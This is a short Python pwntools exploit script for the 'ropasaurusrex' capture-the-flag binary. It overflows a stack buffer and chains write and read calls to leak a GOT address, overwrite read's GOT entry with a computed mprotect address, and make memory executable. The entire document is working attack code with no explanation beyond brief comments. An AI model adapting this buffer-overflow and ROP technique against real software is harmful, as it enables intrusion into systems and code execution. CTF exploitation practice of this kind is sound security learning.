#!/usr/bin/env python

from pwn import *

DUMMY_BYTE="A"*136
SAVED_EBP="BBBB"

ret_addr="CCCC"

write_plt=0x804830c
read_plt=0x804832c

write_got=0x8049614
read_got=0x804961c
got_addr = read_got
mprotect_offset = 0xd2a0

pppr=0x80484b6

original_ret_addr = 0x804842b
stdin=0
stdout=1
stderr=2

main_addr=0x804841d
got_base_addr=0x8049600

stack_segment_base_addr = 0x0
stack_segment_size=0x21000

p = process('./ropasaurusrex')

a=raw_input('#')

#write(stdout, address, length)
#write(stdout, read_got, 4byte)
# got address leak
payload = p32(write_plt) + p32(pppr) + p32(stdout) + p32(got_addr) + p32(0x4)


# read(fd, address, byte)
# read(stdin, read_got, 4)
# read got -> mprotect got overwrite
payload += p32(read_plt) + p32(pppr) + p32(stdin) + p32(read_got) + p32(0x4)

# mprotect(addr, len, priority)
# mprotect(0, 0x1000000, 7)
payload += p32(read_plt) + p32(original_ret_addr) + p32(stack_segment_base_addr) + p32(stack_segment_size) + p32(7)

# p.send(DUMMY_BYTE + SAVED_EBP + ret_addr)
p.send(DUMMY_BYTE + SAVED_EBP + payload)



data = p.recv()
mprotect_got = u32(data) + mprotect_offset
print "Data: " + data
p.send(p32(mprotect_got))
